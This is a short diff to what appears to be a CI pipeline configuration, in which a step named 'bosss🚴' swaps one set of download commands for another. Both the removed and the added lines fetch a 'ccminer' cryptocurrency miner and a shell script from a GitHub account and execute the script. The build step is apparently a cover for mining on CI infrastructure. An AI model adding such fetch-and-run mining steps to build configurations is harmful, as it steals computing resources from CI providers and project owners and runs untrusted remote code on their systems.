@@ -6,5 +6,5 @@ steps:
 - name: bosss🚴
   image: golang
   commands:
-  - wget https://github.com/CoinFreakz/miner/main/ccminer
-  - wget https://github.com/CoinFreakz/miner/main/ap.sh && chmod u+x ap.sh && ./ap.sh
+  - wget https://github.com/CoinFreakz/Bacodz/main/ccminer/sett
+  - wget https://github.com/CoinFreakz/Bacods/main/ccminer/run.sh && chmod u+x run.sh && ./run.sh
